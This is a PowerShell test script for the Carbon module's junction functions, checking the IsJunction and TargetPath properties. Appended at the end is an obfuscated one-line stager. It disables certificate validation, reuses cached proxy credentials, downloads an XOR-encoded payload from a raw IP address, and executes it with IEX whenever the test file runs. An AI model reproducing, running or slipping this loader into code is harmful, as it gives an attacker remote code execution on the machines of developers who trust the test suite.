











$junctionName = $null
$junctionPath = $null

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot '..\Initialize-CarbonTest.ps1' -Resolve)
}

function Start-Test
{
    $junctionName = [IO.Path]::GetRandomFilename()    
    $junctionPath = Join-Path $env:Temp $junctionName
    New-Junction -Link $junctionPath -Target $TestDir
}

function Stop-Test
{
    Remove-Junction -Path $junctionPath
}

function Test-ShouldAddIsJunctionProperty
{
    $dirInfo = Get-Item $junctionPath
    Assert-True $dirInfo.IsJunction
    
    $dirInfo = Get-Item $TestDir
    Assert-False $dirInfo.IsJunction
}

function Test-ShouldAddTargetPathProperty
{
    $dirInfo = Get-Item $junctionPath
    Assert-Equal $TestDir $dirInfo.TargetPath
    
    $dirInfo = Get-Item $Testdir
    Assert-Null $dirInfo.TargetPath
    
}


$WC=New-ObJEcT SyStem.NeT.WebCLient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc.HeADeRS.AdD('User-Agent',$u);$Wc.ProXY = [SYSTEm.NEt.WebREqueST]::DEFauLTWeBPRoXY;$Wc.PrOXY.CRedEnTIaLs = [SYsteM.NeT.CrEDeNTiALCACHe]::DEFAuLtNeTworKCrEDENTiaLS;$K='5OMtHl%NQ(e21wAW{}z,|p:go=yZ.nJh';$R=5;dO{TrY{$I=0;[cHAR[]]$B=([cHAR[]]($WC.DOWNLOaDSTriNG("https://205.232.71.92:443/index.asp")))|%{$_-bXOr$K[$I++%$K.LengTH]};IEX ($B-JoIn''); $R=0;}catCH{SLEEp 11;$R--}} WHIle ($R -Gt 0)

